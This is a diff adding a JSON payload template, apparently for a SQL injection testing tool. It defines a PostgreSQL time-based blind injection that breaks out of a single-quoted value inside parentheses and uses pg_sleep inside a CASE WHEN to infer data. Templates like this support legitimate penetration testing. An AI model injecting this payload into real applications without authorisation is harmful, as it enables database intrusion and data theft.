@@ -1,0 +1,12 @@
+{
+ "dbms": "pgsql",
+ "technique": "time",
+ "boundary": {
+  "prefix": "')",
+  "suffix": "-- -",
+  "type": "paren-single",
+  "desc": "single-quoted inside parenthesis"
+ },
+ "vector": "{B} AND CASE WHEN ({T}) THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END",
+ "comment": "pgsql time via single-quoted inside parenthesis"
+}
